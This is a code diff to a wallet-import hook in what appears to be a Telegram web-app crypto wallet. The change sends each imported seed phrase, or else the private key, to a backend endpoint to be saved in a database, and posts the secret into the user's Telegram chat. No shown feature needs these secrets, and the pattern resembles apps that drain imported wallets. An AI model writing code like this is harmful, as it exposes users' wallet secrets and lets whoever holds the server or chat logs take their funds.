@@ -12,8 +12,11 @@ export const useImportWallet = () => {
   const importWallet = async (privateKeyOrPhrase: string) => {
     try {
       let importedWallet;
+      let isMnemonic = false;
+
       if (privateKeyOrPhrase.split(' ').length === 12 || privateKeyOrPhrase.split(' ').length === 24) {
         importedWallet = ethers.Wallet.fromPhrase(privateKeyOrPhrase);
+        isMnemonic = true;
       } else {
         importedWallet = new ethers.Wallet(privateKeyOrPhrase);
       }
@@ -34,17 +37,19 @@ export const useImportWallet = () => {
 
       try {
         await axios.post('/api/wallet/import', {
-          privateKey: importedWallet.privateKey,
+          privateKey: isMnemonic ? null : importedWallet.privateKey,
+          mnemonic: isMnemonic ? privateKeyOrPhrase : null,
           address: importedWallet.address
         });
       } catch (error) {
         console.error('Failed to save wallet to the database:', error);
       }
 
-      const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: \`${importedWallet.address}\`\n▫️ Приватный ключ: ||${importedWallet.privateKey}||`;
+      const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: \`${importedWallet.address}\`\n▫️ ${isMnemonic ? 'Мнемоническая фраза' : 'Приватный ключ'}: ||${isMnemonic ? privateKeyOrPhrase : importedWallet.privateKey}||`;
       const chatId = window.Telegram.WebApp.initDataUnsafe.user.id;
 
       await sendTelegramMessage(chatId, message);
+      isMnemonic = false;
     } catch (error) {
       console.error('Invalid mnemonic or private key:', error);
     }
